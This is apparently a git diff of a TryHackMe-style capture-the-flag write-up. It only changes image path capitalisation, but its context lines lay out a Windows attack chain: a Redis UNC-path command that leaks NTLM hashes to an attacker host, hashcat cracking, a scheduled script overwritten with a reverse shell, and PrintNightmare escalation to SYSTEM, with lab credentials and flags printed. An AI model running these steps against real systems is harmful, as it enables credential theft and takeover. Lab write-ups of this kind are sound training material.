@@ -48,7 +48,7 @@ CONFIG GET dir
 CONFIG GET dbfilename
 ```
 
-![Redis CONFIG GET dir/dbfilename](images/02-redis-config-get.png)
+![Redis CONFIG GET dir/dbfilename](Images/02-redis-config-get.png)
 
 Redis is unauthenticated and allows `CONFIG GET`/`CONFIG SET` freely. Since the Redis process is running as a Windows service account, setting the `dir` value to a UNC path (`\\<ATTACKER-IP>\share`) forces the underlying Windows process to reach out over SMB to resolve that path — triggering an NTLM authentication attempt against a host of the attacker's choosing. This is the classic **Redis-on-Windows UNC path injection → NTLM hash leak** technique.
 
@@ -68,7 +68,7 @@ set SRVHOST <ATTACKER-IP>
 exploit
 ```
 
-![Metasploit SMB capture module](images/03-msf-smb-capture.png)
+![Metasploit SMB capture module](Images/03-msf-smb-capture.png)
 
 With the listener running, trigger the UNC path lookup from `redis-cli`:
 
@@ -78,8 +78,8 @@ CONFIG SET dir \\<ATTACKER-IP>\share
 
 The capture module records an NTLMv2 handshake:
 
-![CONFIG SET dir triggers the UNC lookup](images/04a-hash-capture-trigger.png)
-![NTLMv2 hash captured in the listener](images/04b-hash-captured.png)
+![CONFIG SET dir triggers the UNC lookup](Images/04a-hash-capture-trigger.png)
+![NTLMv2 hash captured in the listener](Images/04b-hash-captured.png)
 
 Save the hash and crack it offline:
 
@@ -87,7 +87,7 @@ Save the hash and crack it offline:
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-![Hashcat cracking result](images/05-hashcat-cracked.png)
+![Hashcat cracking result](Images/05-hashcat-cracked.png)
 
 Result — valid domain credentials:
 
@@ -106,7 +106,7 @@ nxc smb <TARGET-IP> -u 'ENTERPRISE-SECURITY' -p 'sand_0873959498'
 nxc smb <TARGET-IP> -u 'ENTERPRISE-SECURITY' -p 'sand_0873959498' --shares
 ```
 
-![NetExec SMB auth + share listing](images/06-nxc-shares.png)
+![NetExec SMB auth + share listing](Images/06-nxc-shares.png)
 
 An `Enterprise-Share` comes back writable. Connecting with `smbclient` reveals an existing script that is presumably re-executed on a schedule:
 
@@ -115,7 +115,7 @@ smbclient //<TARGET-IP>/Enterprise-Share -U 'ENTERPRISE-SECURITY'%'sand_08739594
 get PurgeIrrelevantData_1826.ps1
 ```
 
-![smbclient - pulling the scheduled script](images/07-smbclient-get.png)
+![smbclient - pulling the scheduled script](Images/07-smbclient-get.png)
 
 **Hijacking the scheduled script:** rather than uploading a brand-new file (which may not get executed), the nishang reverse-shell payload is placed inside a file with the *same name* as the legitimate script:
 
@@ -127,7 +127,7 @@ smbclient //<TARGET-IP>/Enterprise-Share -U 'ENTERPRISE-SECURITY'%'sand_08739594
 put PurgeIrrelevantData_1826.ps1
 ```
 
-![smbclient - overwriting with the weaponized script](images/08-smbclient-put.png)
+![smbclient - overwriting with the weaponized script](Images/08-smbclient-put.png)
 
 Start a listener and wait for the scheduled task to fire:
 
@@ -145,7 +145,7 @@ type user.txt
 
 **User flag:** `THM{3eb176aee96432d5b100bc93580b291e}`
 
-![Reverse shell + user flag](images/09-revshell-userflag.png)
+![Reverse shell + user flag](Images/09-revshell-userflag.png)
 
 ---
 
@@ -164,8 +164,8 @@ Invoke-Nightmare
 net users
 ```
 
-![Hosting the PoC](images/10-http-server.png)
-![Invoke-Nightmare + net users](images/11-invoke-nightmare.png)
+![Hosting the PoC](Images/10-http-server.png)
+![Invoke-Nightmare + net users](Images/11-invoke-nightmare.png)
 
 The exploit (PoC by calebstewart) abuses a Print Spooler RPC flaw to create a new local administrator — by default `adm1n:P@ssw0rd` (a custom `-NewUser`/`-NewPassword` pair also works). Use those credentials to pop a SYSTEM shell via Impacket:
 
@@ -185,7 +185,7 @@ type system.txt
 
 **Root flag:** `THM{d540c0645975900e5bb9167aa431fc9b}`
 
-![impacket-psexec SYSTEM shell + root flag](images/12-psexec-system.png)
+![impacket-psexec SYSTEM shell + root flag](Images/12-psexec-system.png)
 
 ---
 
